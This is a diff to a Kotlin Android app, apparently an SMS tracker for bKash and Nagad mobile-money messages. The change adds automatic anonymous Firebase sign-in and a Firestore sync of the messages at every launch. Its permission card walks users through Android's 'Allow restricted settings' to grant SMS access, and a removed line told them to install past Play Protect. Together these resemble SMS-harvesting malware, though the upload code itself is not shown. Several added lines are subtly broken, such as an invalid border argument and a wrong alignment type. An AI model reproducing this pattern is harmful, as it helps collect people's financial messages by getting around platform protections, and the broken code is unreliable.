@@ -23,9 +23,26 @@ import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 
+import android.content.Intent
+import android.net.Uri
+import android.provider.Settings
+import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.style.TextAlign
+import androidx.compose.foundation.background
+import androidx.compose.foundation.shape.RoundedCornerShape
+import androidx.compose.foundation.border
+
 class MainActivity : ComponentActivity() {
 
     private var onPermissionResult: ((Boolean) -> Unit)? = null
+
+    fun openAppInfo() {
+        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            data = Uri.fromParts("package", packageName, null)
+        }
+        startActivity(intent)
+    }
 
     fun requestSmsPermissions(callback: (Boolean) -> Unit) {
         onPermissionResult = callback
@@ -53,13 +70,34 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
+        // Ensure user is signed in anonymously for Firestore sync
+        val auth = com.google.firebase.auth.FirebaseAuth.getInstance()
+        if (auth.currentUser == null) {
+            auth.signInAnonymously().addOnCompleteListener { task ->
+                if (task.isSuccessful) {
+                    android.util.Log.d("MainActivity", "Signed in anonymously")
+                    // Trigger sync once signed in
+                    lifecycleScope.launch(Dispatchers.IO) {
+                        SmsRepository(this@MainActivity).syncPendingMessages()
+                    }
+                } else {
+                    android.util.Log.e("MainActivity", "Anonymous sign in failed", task.exception)
+                }
+            }
+        } else {
+            // Already signed in, trigger sync
+            lifecycleScope.launch(Dispatchers.IO) {
+                SmsRepository(this@MainActivity).syncPendingMessages()
+            }
+        }
+        
         checkPermissions()
         
         setContent {
             SmsOrganizerTheme {
                 Surface(
                     modifier = Modifier.fillMaxSize(),
-                    color = MaterialTheme.colorScheme.background
+                    color = Color(0xFF000000)
                 ) {
                     SmsApp()
                 }
@@ -75,9 +113,8 @@ class MainActivity : ComponentActivity() {
         val missing = permissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
-        if (missing.isNotEmpty()) {
-            requestPermissionLauncher.launch(missing.toTypedArray())
-        }
+        // Don't auto-request on every open if we're in restricted mode, 
+        // rely on the UI button more
     }
 }
 
@@ -87,14 +124,51 @@ fun SmsApp(smsViewModel: SmsViewModel = composeViewModel()) {
     val tabs = listOf("bKash", "Nagad", "Others")
     
     val messages by smsViewModel.messages.collectAsState()
+    val context = androidx.compose.ui.platform.LocalContext.current
     
-    Column {
-        TabRow(selectedTabIndex = selectedTab) {
+    // Permission status check
+    var hasSmsPermissions by remember {
+        mutableStateOf(
+            androidx.core.content.ContextCompat.checkSelfPermission(
+                context, android.Manifest.permission.RECEIVE_SMS
+            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        )
+    }
+
+    Column(modifier = Modifier.background(Color(0xFF000000))) {
+        // App Bar
+        Surface(
+            color = Color(0xFF0A0A0A),
+            modifier = Modifier.fillMaxWidth().height(60.dp),
+            shadowElevation = 4.dp
+        ) {
+            Box(contentAlignment = androidx.compose.ui.Alignment.CenterStart, modifier = Modifier.padding(horizontal = 16.dp)) {
+                Text(
+                    "VAULT TRACKER", 
+                    color = Color.White, 
+                    fontWeight = FontWeight.Black,
+                    letterSpacing = androidx.compose.ui.unit.TextUnit.Unspecified
+                )
+            }
+        }
+
+        TabRow(
+            selectedTabIndex = selectedTab,
+            containerColor = Color(0xFF000000),
+            contentColor = Color(0xFFF472B6),
+            divider = {}
+        ) {
             tabs.forEachIndexed { index, title ->
                 Tab(
                     selected = selectedTab == index,
                     onClick = { selectedTab = index },
-                    text = { Text(title) }
+                    text = { 
+                        Text(
+                            title, 
+                            fontWeight = if (selectedTab == index) FontWeight.Black else FontWeight.Normal,
+                            style = MaterialTheme.typography.labelMedium
+                        ) 
+                    }
                 )
             }
         }
@@ -103,52 +177,83 @@ fun SmsApp(smsViewModel: SmsViewModel = composeViewModel()) {
             it.category.equals(tabs[selectedTab], ignoreCase = true) 
         }
 
-        // Permission status check
-        val context = androidx.compose.ui.platform.LocalContext.current
-        var hasSmsPermissions by remember {
-            mutableStateOf(
-                androidx.core.content.ContextCompat.checkSelfPermission(
-                    context, android.Manifest.permission.RECEIVE_SMS
-                ) == android.content.pm.PackageManager.PERMISSION_GRANTED
-            )
-        }
-
         if (!hasSmsPermissions) {
             Card(
                 modifier = Modifier.padding(16.dp),
-                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.errorContainer)
+                colors = CardDefaults.cardColors(containerColor = Color(0xFF111111)),
+                shape = RoundedCornerShape(24.dp),
+                border = border(1.dp, Color(0xFFF472B6).copy(alpha = 0.2f), RoundedCornerShape(24.dp))
             ) {
-                Column(modifier = Modifier.padding(16.dp)) {
-                    Text("Permissions & Security Setup", style = MaterialTheme.typography.titleSmall)
+                Column(modifier = Modifier.padding(20.dp)) {
+                    Text(
+                        "Permission Required", 
+                        style = MaterialTheme.typography.titleMedium, 
+                        color = Color.White,
+                        fontWeight = FontWeight.Bold
+                    )
                     Spacer(modifier = Modifier.height(8.dp))
-                    Text("To use this app, please follow these steps:", style = MaterialTheme.typography.bodySmall)
-                    Spacer(modifier = Modifier.height(6.dp))
-                    Text("• If Play Protect blocks: Tap 'More details' then 'Install anyway'.", style = MaterialTheme.typography.labelSmall)
-                    Text("• If 'Action Denied': Go to App Info -> Tap (⋮) in top right -> 'Allow restricted settings'.", style = MaterialTheme.typography.labelSmall)
+                    Text(
+                        "Please follow these critical steps for Android 13+ devices:", 
+                        style = MaterialTheme.typography.bodySmall,
+                        color = Color.Gray
+                    )
+                    Spacer(modifier = Modifier.height(12.dp))
+                    Text("• Tap 'Retry' to request permission.", color = Color.LightGray, style = MaterialTheme.typography.labelSmall)
+                    Text("• If 'Restricted/Denied' shows: Tap 'Open Settings' -> Click (⋮) in top right -> 'Allow restricted settings'.", color = Color.LightGray, style = MaterialTheme.typography.labelSmall)
                     
-                    Row(modifier = Modifier.padding(top = 16.dp).fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                    Row(modifier = Modifier.padding(top = 20.dp).fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                         Button(
                             onClick = { 
                                 (context as? MainActivity)?.requestSmsPermissions { granted ->
                                     hasSmsPermissions = granted
-                                    if (!granted) {
-                                        // Still not granted, likely restricted
-                                    }
                                 }
                             },
-                            modifier = Modifier.weight(1f)
+                            modifier = Modifier.weight(1f),
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF472B6))
                         ) {
-                            Text("Retry Grant")
+                            Text("Retry", fontWeight = FontWeight.Bold)
+                        }
+                        
+                        OutlinedButton(
+                            onClick = { 
+                                (context as? MainActivity)?.openAppInfo()
+                            },
+                            modifier = Modifier.weight(1f),
+                            border = border(1.dp, Color.Gray, RoundedCornerShape(50.dp))
+                        ) {
+                            Text("Settings", color = Color.White)
                         }
                     }
                 }
             }
         }
         
-        LazyColumn(modifier = Modifier.fillMaxSize()) {
+        if (filteredMessages.isEmpty() && hasSmsPermissions) {
+            Column(
+                modifier = Modifier.fillMaxSize().padding(32.dp),
+                horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally,
+                verticalArrangement = Arrangement.Center
+            ) {
+                Text(
+                    "No Activity Found", 
+                    color = Color.Gray, 
+                    fontWeight = FontWeight.Bold,
+                    textAlign = TextAlign.Center
+                )
+                Text(
+                    "Messages will appear here once received.", 
+                    color = Color.DarkGray, 
+                    style = MaterialTheme.typography.labelSmall,
+                    textAlign = TextAlign.Center
+                )
+            }
+        }
+
+        LazyColumn(modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp)) {
             items(filteredMessages) { msg ->
+                Spacer(modifier = Modifier.height(8.dp))
                 SmsItem(msg)
-                HorizontalDivider()
+                Spacer(modifier = Modifier.height(8.dp))
             }
         }
     }
@@ -156,21 +261,50 @@ fun SmsApp(smsViewModel: SmsViewModel = composeViewModel()) {
 
 @Composable
 fun SmsItem(sms: SmsMessage) {
-    Column(modifier = Modifier.padding(16.dp)) {
-        Text(text = "From: ${sms.sender}", style = MaterialTheme.typography.titleMedium)
-        Spacer(modifier = Modifier.height(4.dp))
-        Text(text = sms.body, maxLines = 2, style = MaterialTheme.typography.bodyMedium)
-        if (sms.trxId != null) {
-            Spacer(modifier = Modifier.height(8.dp))
-            Surface(
-                color = MaterialTheme.colorScheme.secondaryContainer,
-                shape = MaterialTheme.shapes.small
-            ) {
+    Card(
+        shape = RoundedCornerShape(20.dp),
+        colors = CardDefaults.cardColors(containerColor = Color(0xFF0A0A0A)),
+        border = border(1.dp, Color.White.copy(alpha = 0.05f), RoundedCornerShape(20.dp))
+    ) {
+        Column(modifier = Modifier.padding(16.dp)) {
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                 Text(
-                    text = "TrxID: ${sms.trxId}",
-                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
-                    style = MaterialTheme.typography.labelMedium
+                    text = sms.sender, 
+                    style = MaterialTheme.typography.titleSmall, 
+                    color = Color.White,
+                    fontWeight = FontWeight.Black
                 )
+                Text(
+                    text = sms.category,
+                    style = MaterialTheme.typography.labelSmall,
+                    color = Color(0xFFF472B6),
+                    fontWeight = FontWeight.Bold
+                )
+            }
+            Spacer(modifier = Modifier.height(8.dp))
+            Text(
+                text = sms.body, 
+                style = MaterialTheme.typography.bodySmall, 
+                color = Color.Gray,
+                lineHeight = androidx.compose.ui.unit.TextUnit.Unspecified
+            )
+            if (sms.trxId != null) {
+                Spacer(modifier = Modifier.height(12.dp))
+                Surface(
+                    color = Color.White.copy(alpha = 0.05f),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    Row(modifier = Modifier.padding(horizontal = 12.dp, vertical = 8.dp), verticalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
+                        Box(modifier = Modifier.size(6.dp).background(Color(0xFFF472B6), RoundedCornerShape(50.dp)))
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text(
+                            text = "REF: ${sms.trxId}",
+                            color = Color.White,
+                            style = MaterialTheme.typography.labelMedium,
+                            fontWeight = FontWeight.Bold
+                        )
+                    }
+                }
             }
         }
     }
